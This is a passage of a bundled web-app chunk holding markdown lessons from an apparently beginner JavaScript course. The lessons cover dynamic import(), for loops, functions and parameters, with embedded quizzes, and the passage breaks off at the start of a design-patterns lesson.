undefinded | Gregory Trump →→→\n\n◘◘![ico-20 hw] 10◘◘\n\n~~~js\nvar  students = [\n  {\n    name: 'Piter Clark',\n    homeworks: [10, 7, 8, 5, 9, 6, 4, 8, 7]\n  },\n  {\n    name: 'Helen Surmot',\n    homeworks: [5, 4, 7, 6, 8, 7, 7, 6, 8]\n  },\n  {\n    name: 'Pavel Farios',\n    homeworks: [9, 8, 9, 10, 7, 7, 8, 6, 8]\n  },\n  {\n    name: 'Alex Figa',\n    homeworks: [4, 5, 4, 6, 7, 5, 6, 7, 8]\n  },\n  {\n    name: 'Gregory Trump',\n    homeworks: [3, 5, 4, 6, 5, 7, 6, 6, 7]\n  }\n]\n~~~\n\n→→→ students[4].homeworks[1] | 7, 10, 8, 4, 5, 9, undefinded | 5 →→→\n\n________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-data-structures)\n"},6170:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-25 study] Dynamic import\n\n**ES 2019**\n\n__________________________________________________\n\nNow we have a choice between static (**~import~**) and dynamic (**~import()~**) imports.\n\nDynamic import is represented by a new **~import()~** function that returns a promise.\n\n![ico-25 warn] Strictly speaking, **~import()~** is not a function in the sense of inheriting from **~Function~**, it is not an object at all.\n\n_________________________________\n\n![ico-30 cap] ** 1**\n\nRun the following code in the console:\n\n~~~js\ndocument.body.onclick = async () => {\n  const module = await import('https://garevna.github.io/js-samples/js/index21.js')\n}\n~~~\n\n^^![ico-20 speach] Notably, there is no **_~export~_** directive in the **_index21.js_**file.^^\n^^However, the import worked, and the script ran.^^\n\n{{{dynamic-import-1.js}}}\n\n____________________________________\n\n![ico-30 cap] ** 2**\n\n^^In this example, the scripts are imported dynamically, sequentially, with a delay of a few seconds.^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst scriptPath = 'https://garevna.github.io/js-samples/js/index'\n\nimport(`${scriptFile}12.js`)\n  .then(module => setTimeout(() => import(`${scriptPath}21.js`)))\n  .then(setTimeout(() => import(`${scriptPath}22.js`), 10000))\n~~~\n\n^^Let's use an asynchronous function to simplify the code:^^\n\n◘◘![ico-20 paper]◘◘\n\n~~~js\nconst timeOut = timeInterval => new Promise(resolve => setTimeout(() => resolve(), timeInterval))\n\nconst scriptImports = async moduleFile => {\n  await import(`${moduleFile}12.js`)\n  await timeOut(8000)\n  await import(`${moduleFile}21.js`)\n  await timeOut(12000)\n  await import(`${moduleFile}22.js`)\n}\n\nscriptImports('https://garevna.github.io/js-samples/js/index')\n~~~\n\n_____________________________________________________\n\n![ico-30 cap] ** 3**\n\nSuppose we include the script **~index.js~** in the markup:\n\n◘◘^^![ico-20 paper] index.html^^◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html>\n  &lt;head>\n    &lt;meta charset=\"utf-8\">\n    &lt;title>ES Modules&lt;/title>\n&lt;/head>\n\n  &lt;body>\n    &lt;script src=\"js/index.js\">&lt;/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\nThe code in the file **~index.js~** creates an element ~&lt;script>~ with the attribute **~type=\"module\"~** and inserts it into the page:\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\nmod.type = 'module'\n~~~\n\nThe ~&lt;script>~ element contains code that imports the **_~showMessage~_** function from the file **~js/testESModules.js~**\n\nand calls it with the text \"_Hi, students! Welcome to new age of ES Modules!_\"\n\n~~~js\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nFull code:\n\n◘◘^^![ico-20 paper] js/index.js^^◘◘\n\n~~~js\nconst mod = document.body\n  .appendChild(document.createElement('script'))\n\nmod.type = 'module'\n\nmod.textContent = `\n  import { showMessage } from './js/testESModules.js'\n  showMessage('Hi, students! Welcome to new age of ES Modules!')\n`\n~~~\n\nNamed export in file **~js/testESModules.js~**:\n\n◘◘^^![ico-20 paper] js/testESModules.js^^◘◘\n\n~~~js\nexport function showMessage (message) {\n  const demo = document.body.appendChild(document.createElement('div'))\n  demo.style = `\n    position: fixed;\n    top: 15%; left: 15%;\n    bottom: 15%; right: 15%;\n    box-shadow: 8px 8px 12px #00000090;\n    border: solid 0.5px #bbb;\n    padding: 32px;\n    z-index: 300;\n    background-color: #000;\n  `\n  demo.innerHTML = `\n    <h2 style='color: #789'>Module was successfully imported</h2>\n    <p style='color: #fa0'>Now you can see how it works :)</p>\n    <hr>\n    <p style='color: #dde'>${message}</p>\n  `\n  setTimeout(() => document.body.removeChild(demo), 10000)\n}\n~~~\n\n{{{dynamic-import-3.js}}}\n\n__________________________________________________________\n\n![ico-20 warn] When importing modules, you should specify either the full path:\n\n~~~js\nimport { showMessage } from 'https://example.com/js/testESModules.js'\n~~~\n\nor a relative path starting with ~ /~, ~./~ or ~../~:\n\n~~~js\nimport { showMessage } from './js/testESModules.js'\n~~~\n\nOtherwise the import will fail.\n\n________________________________________________________________________\n\n\n[![ico-25 cap] **Live demo**](samples/25)\n\n______________________________________________________________________\n"},12908:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Operator for\n\nWell, now we have reached the third fundamental principle of structural programming - loops.\nAs I hope we already know, a loop is a repetition of the same actions several times.\nThat is, there is some code that must be executed repeatedly.\nThis code is placed in curly braces **~{}~** and is called the **body of the loop**.\n\nEach repetition of the loop is called a **loop iteration**.\n\nThus, any loop statement will have a body, and this body is always enclosed in curly braces.\nBut every loop has one important task: to stop at the right time.\nWe cannot endlessly repeat the execution of the code in curly braces.\nAn endless loop means a browser tab freezing. We certainly don't need it.\n\nSo, we need to stop the loop at the right time.\nTo do this, determine when the loop should be stopped.\n\nThere are options:\n- Directly specify how many times the loop should be executed;\n- Set some condition that the loop will be repeated if it is fulfilled. Such a condition (some expression) is always placed in parentheses.\nThe loop condition can be any evaluated expression (i.e. syntactically correct), but after evaluating the value of this expression, the engine will always cast it to a boolean type (**~true~** or **~false~**).\n\nSo, any loop operator has three mandatory parts: **the operator name** (keyword), a **condition** in parentheses, and a **body** in curly braces.\n\nWe begin our journey through loops with the **~for~** loop statement.\n\n## ![ico-30 icon] Syntax\n\nThe **~for~** loop statement requires a counter variable (loop variable) that must:\n1. have a start value. That is, it must be declared and assigned a start value;\n2. the variable must change its value after each iteration of the loop (otherwise the loop will be infinite);\n3. at each iteration, the loop variable's value must be checked to see if the constraint is met (otherwise the loop will be infinite).\n\nFor the **~for~** loop statement, everything about the loop variable (initialisation, modification, checking) is placed in parentheses:\n\n~~~js\nfor (initialization; checking; modification) {\n  ...body od the loop\n}\n~~~\n\nНапример:\n~~~js\n// initialization:\nvar index = 0\n// checking:\nindex < 10\n// modification:\nindex++\n~~~\n\nThen we get the following picture:\n\n~~~js\nfor (var index = 0; index < 10; index++) {\n  ...body of the loop\n}\n~~~\n\nIt remains to fill the loop body with code.\n\n_____________________________________________________________________\n\n## ![ico-30 icon] Directive break\n\nInterrupts the loop execution.\n\nThe point is that none of the phases (initialisation; condition; update) for a loop variable is mandatory.\nTheoretically, you can organise a loop in which all three phases will be skipped:\n\n~~~js\nfor (; ;) {\n  console.log('Iteration')\n  if (Math.random() < 0.5) break\n}\n~~~\n\n^^Here we used the **~random~** function of the built-in library <a href=\"#byblyoteka_Math\">**Math**</a>.^^\n\nIn this case, the loop control is transferred to the loop body.\nNot a very nice solution, is it?\nIf you don't want to mess with the loop variable, you'd better use the **~while~** loop operator, which will be discussed later.\nBut purely out of sporting interest, this option is worth considering.\n\nFor example, if you want to print all numbers from 1 to 10 to the console, you can do it this way:\n\n~~~js\nfor (var i = 1; ; i++) {\n  if (i > 10) break\n  console.log(i)\n}\n~~~\n\nThe condition on the loop variable is omitted here, which would result in an infinite loop if we didn't put the loop interrupt ~break~ inside its body.\n\n_____________________________________________________________________\n\n## ![ico-25 icon] Directive continue\n\nInterrupts the execution of the current loop iteration.\n\nFor example, if you want to print only even numbers up to 10 to the console, you can do this:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 === 0) console.log(i)\n}\n~~~\n\nOr you can do it this way:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 !== 0) continue\n  console.log(i)\n}\n~~~\n\n^^Since there is only one operation in the body of the conditional operator ~if~, we have omitted the curly brackets.^^\n\n^^~ %~ is an operation to take the remainder of division (~4 % 2~ will be 0, ~5 % 2~ will be 1).^^\n\n^^~x !== y~ the value or data type of the variable ** x** does not match the value or data type of the variable ** y**.^^\n\n_________________________________________________\n\n## ![ico-30 icon] Examples\n\n◘◘![ico-25 cap]** 1**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 0; i < 10; i++) {\n  res += i * 2\n}\n~~~\n\nExplanation of the expression in parentheses:\n\n~~~js\n(var i = 0; i < 10; i++)\n~~~\n\n| ~var i = 0~ | ^^initialise the loop variable, i.e. declare it and assign it the initial value 0.^^ |\n| ~i++~ | ^^method of changing the loop variable at each iteration<br>in this case, after each iteration the loop variable will be incremented by one.^^ |\n| ~i < 10~ | ^^set a limit on the number of loop iterations<br>( the loop variable value will be incremented as long as it is less than 10).^^ |\n\n• ^^In this example, the value of the evaluated expression ~i * 2~ will be added to the value of the ~res~ variable 10 times.^^\n• ^^On the first iteration of the loop, the value of the loop variable ** i** will be 0, so the value of the ~res~ variable will not change.^^\n• ^^After the first iteration, the value of the loop variable ** i** will be incremented by one, and will become equal to 1.^^\n• ^^On the second iteration of the loop, the value of the expression ~i * 2~ will already be equal to 2. This value will be added to the value of the ~res~ variable, which will be equal to 2.^^\n• ^^After iteration the value of the loop variable ** i** will again increase by 1 and become equal to 2.^^\n• ^^At the third iteration the expression ~i * 2~ will take the value 4.^^\n• ^^This value will be added to the value of the ~res~ variable, which will become ~2 + 4 = 6~.^^\n\n^^And so on...^^\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 2**◘◘\n\n~~~js\nfor (var i = 1; i < 10;) {\n  console.log(i++)\n}\n~~~\n\nIn this example, the loop variable is incremented inside the loop body.\nHowever, I do not recommend doing it this way.\nIt requires extra care and may cause errors.\nSuch ‘tricks’ are good for **~while~** and **~do...while~** loop operators, but if you use the **~for~** operator, it is better not to show off and make all the settings for the loop variable in parentheses. It is more clear and easier to debug.\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 3**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 100; i > 0; i--) {\n  res += i % 2\n}\n\nconsole.log(res)\n~~~\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 4**◘◘\n\n~~~js\nfor (var i = 2; i < 100; i *= 2) {\n  console.log(i)\n}\n~~~\n\nConsole output of powers of two.\n____________________________________________________________________\n\n◘◘![ico-25 cap] Массив◘◘\n\n~~~js\nvar res = 0, arr = [2, 1, 5, 3], i\n\nfor (i = 0; i < arr.length; i++) {\n  res += arr[i]\n}\n~~~\n\n^^We use the length of the array ~arr.length~ as a limit on the number of iterations of the loop:^^\n\n~~~js\ni < arr.length\n~~~\n\n^^i.e. as long as the loop variable is less than the array length, the loop will be repeated.^^\n\n^^The result of the loop will be the sum of the elements of the array ~arr~ in the variable ~res~.^^\n\n^^![ico-20 warn] You can change the value of a loop variable at each iteration by a number other than one.^^\n\n^^The following code will print all odd numbers from 1 to 20 to the console:^^\n\n~~~js\nfor (var i = 1; i < 20; i += 2) {\n  console.log(i)\n}\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n\n~~~js\nvar number = 5\n\nfor (; number > 2; number -= 2) {\n  ++number\n}\n~~~\n\n→→→ What will be the value of the variable number after the loop completes? | 1, 2, 3, 4, 5, 6 | 2→→→\n\n\n◘◘![ico-25 hw] **2-3**◘◘\n~~~js\nvar x = 0, y = 0, numbers = [1, 2, 3, 4]\n\nvar res_x = 0, res_y = 0\n\nfor (var i = 0; i < arr.length-1; i++) {\n  res_x += numbers[x++]\n  res_y += numbers[++y]\n}\n~~~\n\n→→→ What will be the value of the variable res_x after the loop completes? | 1, 3, 5, 6, 9, 10 | 6→→→\n→→→ What will be the value of the variable res_y after the loop completes? | 1, 3, 5, 6, 9, 10 | 9→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n~~~js\nfor (var number = 11; number > 2; number -= 2) {\n  number++\n}\n~~~\n\n→→→ What will be the value of the variable number after the loop completes? | 1, 2, 3, 4, 5, 6, 7 | 2→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n~~~js\nfor (var number = 7; number > 2; --number) {\n  number--\n}\n~~~\n\n→→→ What will be the value of the variable number after the loop completes? | 1, 2, 3, 4, 5, 6, 7 | 1→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n~~~js\nfor (var number = -1; number-- > -11; number *= 2) {}\n~~~\n\n→→→ What will be the value of the variable number after the loop completes? | 0, -1, -9, -11, -12, -20, -21, -22, -23 | -23→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n~~~js\nvar messages = ['Hi! ', 'Welcome! ', 'Nice to see you. ', 'How are you?']\n\nvar message = ''\n\nfor (var index = -1; index < messages.length; index += 2) {\n  message += messages[index] || ''\n}\n~~~\n\n→→→ What will be in the message variable after the loop completes? | 'Hi! Welcome! Nice to see you. How are you?', 'Hi! How are you?', 'Hi! Welcome! ', 'Hi! Nice to see you.', 'Welcome! Nice to see you. How are you?', 'Welcome! How are you?', 'Nice to see you. How are you?', 'How are you?' | Welcome! How are you?→→→\n____________________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-for)\n"},32123:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Функции\n\n@@@@\nNow we'll learn how to work with another very important type of data: **~function~**.<br>Our entire \"JS universe\" is based on functions.<br><br>**Functions are a reference type of data.**.<br><br>This means that after declaring a function, we will have a variable in our hands that will be a reference to the function.\n![](images/funcs-are-our-jam.svg)\n@@@@\n\nWhen someone is sick, a doctor will be called, when there are problems with water supply or sewerage, a plumber will be called, and when there are problems with wiring in the house, we call an electrician. It's good that there are doctors, plumbers and electricians. Please note that they do not live in our house and do not do their work all the time. Otherwise, there would be hell in our house, crowds of people who are doing something all the time... No, no, we call them only when the need arises. They come, do their job and leave. But we still have a phone or another way to call them if the problem arises again.\n\nSame with functions.\nEach function can do something.\nEach function can be called when the need arises.\n\nLet's first learn how to call them.\n^^Indeed, if you have a ready-made drill, then you should learn how to use it ![ico-20 wink].^^\n\n## ![ico-30 icon] Function call\n\nWe have a lot of built-in functions and there are also functions that the browser provides us.\nA function call consists of two parts: the function name and parentheses following the function name, in which **arguments** can be passed, i.e. some data that the function will use in its work.\n\nThere are functions that do not require passing arguments when called. In this case, you can call such a function with empty parentheses, but parentheses are required. If you pass arguments to such a function, it will simply ignore them because they are not needed for it to work. If you pass more arguments than necessary, unnecessary arguments will be discarded.\n\n### ![ico-25 icon] console.log\n\nFor example, we use the browser console, and the code we type in the console is automatically executed after pressing _Enter_.\nBut until now, we didn't know that we could access the console directly (**~console~**) and call one of its functions:\n\n§§§§ Demo | function_console_template §§§§\n\n![ico-25 warn] In order to type multi-line code in the console, use the ~_Shift_ + _Enter_~ keyboard shortcut, since ~_Enter_~ immediately starts the typed line of code for execution:\n\n§§§§ Demo | function_console_01_template §§§§\n\nNow, using ~_Shift_ + _Enter_~ we can declare the object:\n\n§§§§ Demo | function_console_02_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] parseInt\n\nWe also have some very useful built-in functions at our disposal, such as **~parseInt~**, which passes the argument passed to it as an integer.\nIf it is a string starting with digits, the rest of the string is discarded and the integer part of the number consisting of these digits is returned.\nIf it is a floating point number, the integer part of the number is returned.\nIf it is something that is not cast to a number, then **~NaN~** is returned:\n\n§§§§ Demo | function_parseInt_template §§§§\n\nAs you can see, this function waits for the agument when you call it, and if you don't pass it, i.e. call the function with empty parentheses:\n\n~~~js\nparseInt()\n~~~\n\nthen the value of the argument will be **~undefined~**.\n\nHowever, this function can also take a **second argument**.\nBy default, this argument is **10**.\nIf you specify 2, the first argument will be treated as a number in **binary notation**. If the first argument then contains digits other than 0 or 1, the **~parseInt~** function will return **~NaN~**.\nIf you pass 8 as the second argument, the first argument will be treated as a number in **eight digits**.\nIf you pass 16 as the second argument, the first argument will be treated as a number in **hexadecimal notation**.\n\n§§§§ Demo | function_parseInt_01_template §§§§\n\n**The return value will always be a decimal number**.\n\n_____________________________________________________________________\n\n### ![ico-25 icon] Math library\n\nWe also have a built-in library of mathematical functions **Math**.\n\nWe can view its contents in the console:\n\n~~~js\nconsole.log(Math)\n~~~\n\nAnd we will see a long list of all mathematical constants (e.g. PI number) as well as functions:\n\n~~~~console\n▼ Math {abs: ƒ, acos: ƒ, acosh: ƒ, asin: ƒ, asinh: ƒ, …}\n    E: 2.718281828459045\n    LN2: 0.6931471805599453\n    LN10: 2.302585092994046\n    LOG2E: 1.4426950408889634\n    LOG10E: 0.4342944819032518\n    PI: 3.141592653589793\n    SQRT1_2: 0.7071067811865476\n    SQRT2: 1.4142135623730951\n  ► abs: ƒ abs()\n  ► acos: ƒ acos()\n  ► acosh: ƒ acosh()\n  ► asin: ƒ asin()\n  ► asinh: ƒ asinh()\n  ► atan: ƒ atan()\n  ► atan2: ƒ atan2()\n  ► atanh: ƒ atanh()\n  ► cbrt: ƒ cbrt()\n  ► ceil: ƒ ceil()\n  ► clz32: ƒ clz32()\n  ► cos: ƒ cos()\n  ► cosh: ƒ cosh()\n  ► exp: ƒ exp()\n  ► expm1: ƒ expm1()\n  ► floor: ƒ floor()\n  ► fround: ƒ fround()\n  ► hypot: ƒ hypot()\n  ► imul: ƒ imul()\n  ► log: ƒ log()\n  ► log1p: ƒ log1p()\n  ► log2: ƒ log2()\n  ► log10: ƒ log10()\n  ► max: ƒ max()\n  ► min: ƒ min()\n  ► pow: ƒ pow()\n  ► random: ƒ random()\n  ► round: ƒ round()\n  ► sign: ƒ sign()\n  ► sin: ƒ sin()\n  ► sinh: ƒ sinh()\n  ► sqrt: ƒ sqrt()\n  ► tan: ƒ tan()\n  ► tanh: ƒ tanh()\n  ► trunc: ƒ trunc()\n    Symbol(Symbol.toStringTag): \"Math\"\n  ► [[Prototype]]: Object\n~~~~\n\n^^ Note that constant names are written in uppercase, i.e. capital letters.^^\n^^Functions are highlighted with the letter **~ ƒ~** and must have a name. Otherwise, how would we call them? ^^\n\n~~~console\nround: ƒ round()\n~~~\n\nLet's try to call some functions of the **Math** library:\n\n§§§§ Demo | function_math_template §§§§\n\nIn parentheses, we pass **arguments** to functions when calling them.\nFor example, we pass the number 16 to the square root function when we call it:\n\n~~~console\nMath.sqrt(16)\n~~~\n\nand we get the result: 4.\n\nThat is, all mathematical functions return a **value**.\n\nLet's look at such an assignment operator:\n\n~~~js\nvar sin = Math.sin(Math.PI / 2)\n~~~\n\nThe right-hand side of an assignment operator contains an **expression**.\nIn order to perform an assignment, the engine must calculate the **value** of the expression in the right-hand side, and to do this, call the function and pass a number to it.\nBut the parentheses of the function call again contain the **expression** ~Math.PI / 2~.\nThat is, the engine must first calculate the expression in the parentheses, and then pass the resulting value to the ~Math.sin~ function when calling it.\n\n§§§§ Demo | function_math_01_template §§§§\n\nNote that when we run the code for execution in the console:\n\n~~~console\nvar argument = Math.PI / 2\n~~~\n\nthen the console returns ~undefined~.\n\nThis is because the assignment operator does not return any value.\n\nBut when we ask for the value of a variable:\n\n~~~console\nargument\n~~~\n\nthen it returns not ~undefined~, but a number, and we see this number in the console instead of ~undefined~.\n\nSimilarly, when we call the function:\n\n~~~console\nMath.sin(argument)\n~~~\n\nthen the value 1 is returned, and we see that value in the console instead of ~undefined~.\n\nHowever, if we do this:\n\n~~~console\nvar sin = Math.sin(argument)\n~~~\n\nthen we will see ~undefined~ in the console again, because the assignment does not return a value.\n\n______________________________________________\n\nSo, to call a function we need a function name followed by parentheses.\n\nIn the parentheses we can pass the function **arguments**, i.e. the data that the function will use when calculating the return value.\n\nHowever, the function may not return any value, then the engine treats it as if the function returned ~undefined~.\n\nAny line of code that we run in the console by pressing the ~_Enter_~ key is treated as a **anonymous** function call.\n\nIf that line contains an assignment operator, that line of code will return no value, so we see ~undefined~ in the console.\n\nIf we call the **~console.log~** function, it outputs the arguments passed to it to the console but returns no value, so we see ~undefined~ again after the output to the console.\n\nFinally, let's see what the **~typeof~** operator returns:\n\n§§§§ Demo | function_console_03_template §§§§\n\n______________________________________________\n\n## ![ico-30 icon] Declaring a function\n\nWe have already learnt how to call functions. It's time to learn how to create them, or more precisely, how to declare functions.\nExactly declare, because our goal is not to immediately call a function where we have declared it.\n\nIn order to properly declare a function, we need to understand how a function differs from all other data types.\n\nFirstly, a function contains the code that will be executed when the function is called.\nThis code is placed in curly braces and is called the **body of the function**.\n\n~~~js\n{\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nThere is obviously something missing here, isn't there?\nOf course, after all, the function must have a name so that we can call it.\nAnd more of that, we see a code block in curly braces, and if we put it into our code in this way, it will simply be executed, just like all the lines of code before and after it.\n\n§§§§ Demo | function_00_template §§§§\n\nNo, we obviously need something else.\nFor example, we need the code to be saved under some name, but not executed in the place where it appeared.\nSo that we can run that code later, when we need to, to execute it. Not immediately, but sometime later.\n\nBut if we just write it down:\n\n~~~js\nvar func = {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nthe engine will think we want to create an object (remember how we created data structures?).\nBut we can't use the keyword **_~~var~_** and the assignment operator inside curly braces when declaring an object, because there must be comma-separated pairs (key: value) listed there.\nWhat will the engine respond to our code?\nThe engine will generate the **SyntaxError** exception:\n\n~~~error\n    Uncaught SyntaxError: Unexpected identifier 'number'\n~~~\n\nSo how do we explain to the engine that this is not an object, but the body of a function?\n\nWe need the keyword **~function~** for that.\n\nLet's try to fix the situation like this:\n\n~~~js\nvar func = function {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nand the engine generates a **SyntaxError** exception again:\n\n~~~error\n    Uncaught SyntaxError: Unexpected token '{'\n~~~\n\nThe engine obviously doesn't like the curly bracket after the word **~function~**....\nHmmm... Maybe it should be something else?\n\nAnd now we remember that we always call a function using parentheses, in which arguments can be passed.\n\nAha, that's right, we need to insert parentheses between the **~function~** keyword and the opening curly brace \"{\":\n\n~~~js\nvar func = function () {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nSo, we used the assignment operator, in the right part of which we put the following expression: the keyword **~function~**, followed by parentheses, and then curly brackets for the function body.\n\nAs we already know, the engine will first calculate the expression in the right part of the assignment operator, and then put the obtained value into the **~func~** variable.\nSo, after evaluating the expression in the right part of the assignment operator, a **function object** (in the language specification - ‘**callable object**’) will be created.\nBut all objects, as we already know, are **reference data type**, i.e. a **reference** will be returned to us, which will go into the **~func~** variable.\n\nSo, the code inside the function body has not been executed.\nShall we check it?\n\nLet's declare the variables **~number~** and **~name~** before declaring the function.\n\n§§§§ Demo | function_01_template §§§§\n\nAs you can see, the function declaration did not affect the values of the variables **~number~** and **~name~**.\nThat is, the code in the function body did not work.\nHowever, when we printed the **~func~** variable to the console, we saw the function body. That is, the function's code is stored somewhere, but it has not worked yet.\n\nSo, we have a reference to the function, now we just need to call the function:\n\n~~~js\nfunc()\n~~~\n\n§§§§ Demo | function_02_template §§§§\n\nSuch an assignment:\n\n~~~js\nvar func = function () {}\n~~~\n\nis one of the ways to declare a function, which is called **function expression**.\n\nIndeed, if we use an assignment operator, we have an **expression** on the right-hand side, hence the name **function expression**.\n\nHowever, this is not the only way to declare a function.\n\n_____________________________________________________________________\n\nIn fact, the keyword **_~function~_** instead of the keyword **_~var~_** is quite enough for us:\n\n~~~js\nfunction func () {}\n~~~\n\nThis is another way of declaring a function - **function declaration**.\n\nWe see that the difference from **function expression** is the absence of the assignment operator.\nLater we'll go into details about what it affects and why.\n\nIn fact, we have declared a **_~func~_** variable by immediately specifying its data type when declaring it, i.e. using **_~function~_** instead of **_~var~_**.\n\nThe fact that we don't use the assignment operator doesn't mean that assignment doesn't happen. Assignment happens ‘under the bonnet’. That is, a function is created and a reference to it is placed in the **_~func~_** variable.\n\n_________________________________________________\n\n![ico-25 warn] Parentheses after a variable name indicate a function call and can only be used when the variable is a reference to a function.\nOtherwise, a **TypeError** exception will be generated:\n\n~~~js\nvar func = 10\nfunc()\n~~~\n\n~~~error\n    Uncaught TypeError: func is not a function\n~~~\n_________________________________________________\n\n## ![ico-30 icon] Formal parameters\n\nLet's go back to the fact that parentheses are required when declaring a function.\nWhen calling a function, parentheses are also required.\n\nObviously, parentheses play an important role here.\n\nRecall how parentheses can be used when calling a function: we use them to pass **arguments** to the function. I.e. we place some data to parentheses for the function to use this data at runtime.\n\nOk, but how does the function receive this data?\n\nArguments have to be saved somewhere, and function needs a reference to them to operate with.\n\nAnd where do we store the data? Well, not in drawers, and not in basins, and not in pots.\nWe store our data in **variables**.\n\nThat is, in order to accept the arguments passed when calling a function, we need to prepare the variables where these data (arguments) will be placed beforehand.\n\nAnd somehow it is self-evident that we should place the names of these variables to the same place where the arguments will be received later.\n\nThat is, in parentheses.\n\nDo you see the sense?\n\n§§§§ Demo | function_parameters_template §§§§\n\nThus, when declaring a function, we use parentheses to list there the names of variables that we will use for calculations in the body of the function.\n\nThese variables are called **formal parameters** of the function.\n\nThese variables have no values at the time the function is declared.\n\nWhen the function is called, **arguments** will be listed in parentheses, which will become the values of the formal parameters at this moment.\nThat is, each time we call the function, we can pass different arguments to it, thus getting different results.\n\n### ![ico-25 icon] Default values\n\nObviously, the big problem for us was errors related to passing incorrect values of arguments.\nIn arithmetic operations, in case of an error we will get the insidious value **~NaN~**, which will cause us a lot of trouble.\n\n§§§§ Demo | function_parameters_01_template §§§§\n\nBut in 2015, a new version of the language specification (ES6) was released in which we now have the ability to set default values for function parameters when declaring a function, which avoids the problems of calling a function with no parameters or when those parameters have values **~undefined~**:\n\n§§§§ Demo | function_parameters_02_template §§§§\n\nFurthermore, you can make the default values of the function parameters **calculable**:\n\n§§§§ Demo | function_parameters_03_template §§§§\n\n![ico-25 warn] Note that **default function parameter values** are usefull when a **~undefined~** value (or no value at all) is passed as function arguments.\nThat is, it does not save you from checking for other ‘undesirable’ argument values, such as **~null~**, **~NaN~** or when the argument should be a number and a non-numeric value is passed.\n\n__________________________________________________________________\n\n## ![ico-30 icon] Return operator\n\nThe functions we've declared so far have been kind of \"incomplete\" because they didn't return anything, so we kept seeing that annoying **~undefined~** in the console.\n\nNow, finally, we will get rid of this \"inferiority\" and make our functions return a value.\nAnd it is very easy to do it: there is a unary operator **~return~** for this purpose.\n\n~~~js\nvar calcs = function (x = 1, y = x * 2, z = 0) {\n  return x + y - z\n}\n~~~\n\n![ico-25 warn] This operator can be used only in the function body.\nIf you try to use it outside the function body, an exception will be generated:\n\n~~~error\n    Uncaught SyntaxError: Illegal return statement\n~~~\n\nThe **~return~** operator interrupts function execution, and if the **~return~** operator has an operand (expression), the value of this expression will be calculated and returned by the function.\n\nIf the operand is not explicitly specified, **~undefined~** is implied.\n\n____________________________________________________________________\n\n## ![ico-25 icon] Tests\n\n◘◘** 1**◘◘\n~~~js\nvar func = function (arg) {\n  return Math.random() * arg\n}\n~~~\n\n→→→ What's that? | 'function declaration', 'function expression' | function expression→→→\n\n◘◘** 2**◘◘\n~~~js\nfunction greeting (userName) {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ What's going to be in the console? | '\"\"', 'Hi user!', 'Hi undefined!', 'Hi !' | Hi undefined!→→→\n\n◘◘** 3**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ What's going to be in the console? | '\"\"', 'Hi !', 'Hi undefined!', 'Hi Human!' | Hi Human!→→→\n\n\n◘◘** 4**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Welcome ' + userName + '!'\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ What's going to be in the console? | 'Hi !', 'Welcome !', 'Hi undefined!', 'Welcome undefined!', 'Hi Human!', 'Welcome Human!' | Welcome Human!→→→\n\n◘◘** 5**◘◘\n~~~js\nfunction randomInteger (number = 100) {\n  return Math.round(Math.random() * number)\n}\n~~~\n\n→→→ randomInteger() > 100 | true, false, undefined, 0, NaN | false→→→\n\n◘◘** 6**◘◘\n~~~js\nfunction hexToDecimal (hexNumber = 0) {\n  return parseInt(hexNumber, 16) || 0\n}\n~~~\n\n→→→ !hexToDecimal() | undefined, true, false, 0, NaN | true→→→\n\n◘◘** 7**◘◘\n~~~js\nfunction binToDecimal (bin = '1111111') {\n  return parseInt(bin, 2) || 0\n}\n~~~\n\n→→→ binToDecimal('540') | undefined, true, false, 0, NaN | 0→→→\n\n◘◘** 8**◘◘\n~~~js\nfunction hexToDecimal (hex = 'FF') {\n  return parseInt(hex, 16) || 255\n}\n~~~\n\n→→→ hexToDecimal('rob') | undefined, true, false, 0, NaN, 255 | 255→→→\n____________________________________________________________________\n\n[![ico-25 hw] Quiz](quiz/function)\n\n_______________________________________\n[![ico-20 link] w3schools](external/w3-function)\n[![ico-20 link] MDN](external/mdn-function)\n"},2332:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n## ![ico-25 icon] Pattern Observer\n\nThis is a **behavioral** pattern.\n\nLet's analyze a specific situation in which it can be used.\n\nThere is data that is dynamically updated.\n\nThe data must be displayed to the user.\n\nWe need to ensure that the application is reactive, i.e. the display should be updated quickly when the model data is updated.\n\nAt the same time, the modules must be independent.\n\nHow do we notify the module responsible for presenting data to the user about changes to the model data?\n\n_______________________________\n\n## ![ico-30 cap] Example 